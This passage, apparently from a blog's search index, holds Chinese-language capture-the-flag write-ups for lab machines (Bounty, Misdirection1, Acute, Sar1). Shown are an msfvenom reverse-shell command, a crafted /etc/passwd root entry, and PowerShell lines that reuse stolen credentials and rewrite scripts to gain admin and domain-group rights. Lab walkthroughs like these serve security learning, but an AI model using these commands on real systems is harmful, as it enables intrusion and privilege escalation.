src=\"/vulnhub_img/WEBRESOURCE23f4b310f3c52f8d671b1ba2a42ae1c9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看WP，发现nmap扫描不够仔细：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbfad9953b30ea1fd44f1212fc144357b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003egobuster 的目录扫描同样深度不够：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc241ee655747d357c41721f0e5792afd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003enmap扫出的是一个密钥文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE822d7e7d31a0198c504a1520f579ff00%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用密钥连接：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaa6ead165a5f52834a4a801783825532%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003euser.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7043d9f0bee5074176c989589bcdeaf9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esudo -l\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7a1997783f3707170de9b7ff48a5eee6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eGCC SUDO提权\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE40b176799a71f0652c7fb9f39afb2b81%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe09ad094a2360a7b4949a411fc7d8b09%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eroot.txt是空的？\u003c/p\u003e","title":"0x005 Nyx1"},{"content":"端口扫描 获取立足点 目录扫描要仔细，gobuster最开始没扫出来，添加aspx后缀后扫出了：\n还有一个：\n先上传一个试试：\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 lPORT=8888 -f aspx -o cxk.aspx\n看样子是后端校验：\n这里是没想到的，我一直以为是常见的IIS解析漏洞，但是发现不行，后面看了一下官方文档，这里要FUZZ一下后缀，看看能上传哪些后缀：\n/SecLists-2023.2/Fuzzing/extensions-skipfish.fuzz.txt\n发现congfig是可以使用的：\n这个后缀在IIS7.0以上是可以getshell的：\nhttps://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/\n同时可以在github找到相关项目：\nhttps://github.com/0xPurpl3john/web.config\n提权 也是没有补丁的：\nhttps://github.com/zcgonvh/MS16-032/releases/tag/Release\n运行之前需要重新弹个shell:\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x006-bounty-/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE50b73d52938f8dd92624582f43421360image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE158a53ed50b04b02fe88333a25910e95image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e目录扫描要仔细，gobuster最开始没扫出来，添加aspx后缀后扫出了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd074fad91d7ae895e3d24de42037f0c3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e还有一个：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE290bef7cba7d9b437c8cef6f1fa1ed8aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e先上传一个试试：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEffd0b44cc682f4923731a293cd93e360image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE14cb2d762c34f76a20036fa7fc577504image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003emsfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 lPORT=8888 -f aspx -o cxk.aspx\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEff697c6b8d0b448688cc2c2d7b448c5eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看样子是后端校验：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE428c4be128599fd2c3cc19b820edbd6aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里是没想到的，我一直以为是常见的IIS解析漏洞，但是发现不行，后面看了一下官方文档，这里要FUZZ一下后缀，看看能上传哪些后缀：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0ed7b3810f71f2d3a927add6bab5a3bbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e/SecLists-2023.2/Fuzzing/extensions-skipfish.fuzz.txt\u003c/p\u003e\n\u003cp\u003e发现congfig是可以使用的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE381217727c5fde95497933ca69fb993aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个后缀在IIS7.0以上是可以getshell的：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/\"\u003ehttps://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e同时可以在github找到相关项目：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/0xPurpl3john/web.config\"\u003ehttps://github.com/0xPurpl3john/web.config\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdaecd0d5ed32bb9f118511101dcba521image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEcc32ac0e88720bca4d2ecdddfd9ff008image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE833669069ef148827677d372d1a1ae09image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdb6c7fb99adecbc38aae0f5bc2df1bfdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e也是没有补丁的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE39f51e9e0b66cda8726eba501f80d082image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/zcgonvh/MS16-032/releases/tag/Release\"\u003ehttps://github.com/zcgonvh/MS16-032/releases/tag/Release\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e运行之前需要重新弹个shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE13637ed094fc8cff71e82ec81c435a3aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2a99ab8a07082ec27e2d6e7dddca9cc5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe66629d806b17a054946a7d51858ecd3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe1072ee6aeb1fa4934813b4752dee048image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE64af2bfec5388fe2617f3e5daaad784fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X006 Bounty"},{"content":"端口扫描： web渗透 两个web端口，例行公事，目录扫描：\n8080端口扫描结果：\n80端口扫描极慢，先看了一下8080端口的扫描结果，发现一个命令行页？\n反弹shell，直接弹shell 弹不回来，远程下载webshell 反弹shell成功:\n提权 读取user.txt提示没有权限，然后sudo -l 发现可以无密码执行/bin/bash即可查看，并且成功提权到brexit\n发现passwd文件可写 生成密码 修改密码为这个：$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0 Abcd1234 root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash\n这里修改文件极其诡异，VI盲改老是找不到正确的位置，sed命令修改也总是有问题，最后把passwd文件通过kali传输进去，直接覆盖掉就可以了\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x006-misdirection1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描：\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE809976807a8d1443447a68328cbbfe3e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE94b844bf08b42b37147f53240688edd8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eweb渗透\u003c/h1\u003e\n\u003cp\u003e两个web端口，例行公事，目录扫描：\u003c/p\u003e\n\u003cp\u003e8080端口扫描结果：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE526ca1d7906e40fab934a82c9c054579%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口扫描极慢，先看了一下8080端口的扫描结果，发现一个命令行页？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5361cf692f18a441e669af1c32a006b0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e反弹shell，直接弹shell 弹不回来，远程下载webshell 反弹shell成功:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE368bce6dd5c62305d699ea987ffb9841%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e读取user.txt提示没有权限，然后sudo -l 发现可以无密码执行/bin/bash即可查看，并且成功提权到brexit\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa6980f069602f836394cf544e4dae8c9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch2 id=\"发现passwd文件可写\"\u003e发现passwd文件可写\u003c/h2\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf327939a9b96fc5054efed9aeb1621d7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch3 id=\"生成密码\"\u003e生成密码\u003c/h3\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE975746eadd5935d93cf04daffd804e8c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch3 id=\"修改密码为这个1zyty2uoj1au20m0xd4wo1ymw9z0----abcd1234\"\u003e修改密码为这个：$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0    Abcd1234\u003c/h3\u003e\n\u003cp\u003eroot:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash\u003c/p\u003e\n\u003cp\u003e这里修改文件极其诡异，VI盲改老是找不到正确的位置，sed命令修改也总是有问题，最后把passwd文件通过kali传输进去，直接覆盖掉就可以了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9fc6e33cfcbc02551f5ecc9bef897bbd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x006 Misdirection1"},{"content":"端口扫描 获取立足点 端口扫描没发现东西：\n打开网站看一下：\n修改hosts:\n然后这里是我看到了，但是不知道怎么利用的：\n这里的用户名是看到了：\n同时，这个word也看到了：\n但是没看文件属性：\n然后是文件内容，英语挺重要：\n原始密码是：Password1!\n然后这里其实涉及了一个知识盲区，PSWA是什么东西：\n然后上面说到的会议连接在这里：\n打开页面：\nhttps://atsserver.acute.local/Acute_Staff_Access\n然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：\n然后问了一下GPT：\n也就是说可能是这种变形：\n账户名是：EDavies\n反弹shell:\n这里看是下载成功了，但是好像有杀软，被杀了：\n然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：\n所以还是英语不太好，吃大亏了：\n使用Get-ChildItem -Force可以查看隐藏文件\n权限提升 好吧，这里还是没办法，参考官方文档，只能使用msf了：\n把进程迁移到了explorer:\n通过qwinsta /server:127.0.0.1命令，可以看到edavies用户，也就是当前用户，使用了远程：\n使用\n那么这里可以看到几个信息，主机名：atsserver，密码：w3_4R3_th3_f0rce，用户名：acute\\imonks:\n使用账号密码申请凭据，执行命令：\n$passwd = ConvertTo-SecureString \u0026#34;W3_4R3_th3_f0rce.\u0026#34; -AsPlainText -force\r$cred = New-Object System.Management.Automation.PSCredential (\u0026#34;acute\\imonks\u0026#34;, $passwd)\rInvoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $cred 此时应该是在另外一台主机了，重新侦察信息：\n拿到第一个flag和第二个凭据：\n$securepasswd = \u0026lsquo;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51\u0026rsquo;\n$passwd = $securepasswd | ConvertTo-SecureString\n$creds = New-Object System.Management.Automation.PSCredential (\u0026ldquo;acute\\jmorgan\u0026rdquo;, $passwd)\nInvoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds\n这个用户叫做jmorgan，主机名是 Acute-PC01，也就是我们当前的这台主机，看看这个用户的权限：\n可以发现是这台机器的管理员用户，也就是说我们可以尝试获取到本台主机的管理员权限，\n这时候想到的就是，反弹一个shell回来：\n修改原来的代码为：\nInvoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((Get-Content \u0026#34;c:\\users\\imonks\\Desktop\\wm.ps1\u0026#34; -Raw) -replace \u0026#39;Get-Volume\u0026#39;,\u0026#39;cmd.exe /c c:\\utils\\cxk2.exe\u0026#39;) | set-content -path c:\\users\\imonks\\Desktop\\wm.ps1} -credential $cred 查看修改效果：\n执行一下这个代码：\nInvoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {c:\\users\\imonks\\Desktop\\wm.ps1} -credential $cred 当前用户：\n当前IP：\nhashdump:\nadministrator 是Password@123，两个为空：\n这个密码，是这台机器的，别忘了还有一台叫做ATSSERVER的机器：\n这台机器有以下账户：\n尝试使用Password@123进行登录：\n使用awallace登录成功：\n然后在C:\\Program Files目录中，找到一个目录，叫做keepmeon，这个目录使用imonks用户是进不去的，只能使用awallace用户登录：\n查看：\n这个就比较简单了，计划任务提权：\n但是这里说了，只有lois使用，这个lois是什么权限，我们就能提升到什么权限：\n路易斯是网站管理员，看看site_admin\n根据描述，这个组可以访问domain group:\n本来想重新弹个shell回来，但是琢磨着，可能有杀软，就还是改一下管理组吧：\nInvoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path \u0026#39;c:\\program files\\Keepmeon\\admin.bat\u0026#39; -Value \u0026#39;net group site_admin awallace /add /domain\u0026#39;} 再次查看就可以看到awallace在组内了：\n然后就可以进去administrator目录了：\n查看：\n总结 这个实验室巨难，是一个域内的靶场，两台主机，来回反复获取凭证。\n梳理一下流程：\n入口IP：10.10.11.145 端口扫描： 发现443 https端口，浏览器访问失效，通过证书发现域名，修改hosts文件，成功访问到了网页。\nweb渗透： 首页about us，泄露部分出名员工名称，同时有个新人表单，通过新人表单，可以发现PSWA入口以及默认密码：Password1!，以及创建者主机信息：Acute-PC01以及\n后渗透阶段： 这台靶机目前最好还是使用\n后渗透-横向移动阶段1： 通过查看当前的远程登录会话，可以发现目前的用户acute\\edavies是使用了RDP的，使用meterpreter的屏幕监控功能，查看当前用户的操作，发现了另外一台主机名为：ATSSERVER，以及一个相关凭证：密码：W3_4R3_th3_f0rce.用户：acute\\imonks，使用powershell，申请凭证，获取到ATSSERVER普通权限，可以拿到第一个user.txt，同时使用这个用户可以发现Program Files目录下有个keepmeon目录，是用户安装的，非常规软件目录，但是当前\\imonks用户没有权限进入。\n后渗透-横向移动阶段2： 在第一个user.txt的附近有主机Acute-PC01的脚本信息，虽然密码进行了加密，但是可以修改脚本达到命令执行的效果，反弹一个脚本内用户的权限为：acute\\jmorgan，属于本地管理员用户组，也就是说我们拿到了Acute-PC01主机的管理员权限。\n后渗透-横向移动阶段3： 使用Acute-PC01主机的管理员权限dumphash，拿到本地administrator的密码，但是无法登录ATSSERVER，由于我们之前拥有ATSSERVER的imonks用户，通过查看用户目录，可以知道该主机有哪些用户登录过了，使用Acute-PC01主机的密码进行喷洒，成功获取了一个名为awallace的用户。\n后渗透-横向移动阶段4： awallace用户可以进去keepmeon目录，这个目录下面有个bat文件，内容为计划任务，执行者为\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x007-acute/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7bced707209a355e5b0d8e37665b10c6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1553e03a5a52725213cc98b0d93dad66image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe9bc11587966185546c54c64b1c03fdcimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e端口扫描没发现东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc3827f6e5c0c0ed9fe650ad4b0d794b8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e打开网站看一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfe70211233839785d604541ed4534e40image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改hosts:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd18aed551b61f788a2d4b032bd126d42image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后这里是我看到了，但是不知道怎么利用的：\u003c/p\u003e\n\u003cp\u003e这里的用户名是看到了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7d4afbef001b7925f4b2b74890cd4006image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e同时，这个word也看到了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE738cf0d3e074876b486600fd30f2d176image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是没看文件属性：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEba21a112c62051f8191d46bcefd555faimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后是文件内容，英语挺重要：\u003c/p\u003e\n\u003cp\u003e原始密码是：Password1!\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE93e40bc3cae9ca0fe0f345104db0c13fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后这里其实涉及了一个知识盲区，PSWA是什么东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7787611761e770eccc9a1a9242b89118image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdfad486d271f9e44031a5f10ab92d612image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后上面说到的会议连接在这里：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4d920afa8c0b68c03132d544e4a4fb7aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e打开页面：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://atsserver.acute.local/Acute_Staff_Access\"\u003ehttps://atsserver.acute.local/Acute_Staff_Access\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE70c4428b1e1da9e3183cf2eb22a8ab8eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：\u003c/p\u003e\n\u003cp\u003e然后问了一下GPT：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd5435cb71dc3ff2e46c3830c9455a079image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e也就是说可能是这种变形：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc12c78fb2716be13fa889352ed571759image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e账户名是：EDavies\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE21116ef509fd1d912543fb44a5a5de8eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e反弹shell:\u003c/p\u003e\n\u003cp\u003e这里看是下载成功了，但是好像有杀软，被杀了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE711ea82608ebd740c11c84dc2ed4bf7bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa107fca6b135c6706f24712112b290bcimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e所以还是英语不太好，吃大亏了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbf62ff533327d3c3bdb581f11c9b0800image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用Get-ChildItem -Force可以查看隐藏文件\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE56fea9b0b68d0d25947440b0deff30f2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"权限提升\"\u003e权限提升\u003c/h1\u003e\n\u003cp\u003e好吧，这里还是没办法，参考官方文档，只能使用msf了：\u003c/p\u003e","title":"0X007 Acute"},{"content":"端口扫描 目录扫描 发现sar2HTML目录：\nweb渗透 起初看到这个页面，分析了一会儿，可能是计划任务提权？文件上传？\n后面就开始搜索这个应用的相关漏洞了，且版本合适：\n看了一下脚本，大概这样构造就可以了\n反弹shell:\n提权 user.txtls\n当真计划任务？\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x007-sar1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE299a1334c1a76c6a8fd9682d9553430e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch3 id=\"目录扫描\"\u003e目录扫描\u003c/h3\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0caa1a65f7306ce6c8cb8c29b80eafda%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现sar2HTML目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4f066652fd2a691eda9de11d88847e6a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eweb渗透\u003c/h1\u003e\n\u003cp\u003e起初看到这个页面，分析了一会儿，可能是计划任务提权？文件上传？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEac25e59434fa6dfeb5c98da03c5c32ac%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面就开始搜索这个应用的相关漏洞了，且版本合适：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb788867f85bb8c39eaf57052b0549a7a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd80468f5b0ca51403318b91b2cd6b0b6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE65b77c4dcdf7de4698b608d043836a57%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看了一下脚本，大概这样构造就可以了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE29be72ea5ed8e19610aeaa971556914f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e反弹shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE144974846cd3f5781fc2cc25adacb757%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6cc7c33a07d98693a32c5d8455a9cab4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003euser.txtls\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd2fcdafd45586c53d7d20d9f7472f320%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1ede32229f1c47b5e119120a9d84dfb4%e6%88%aa%e5%9b%be.png\" alt=\"\" 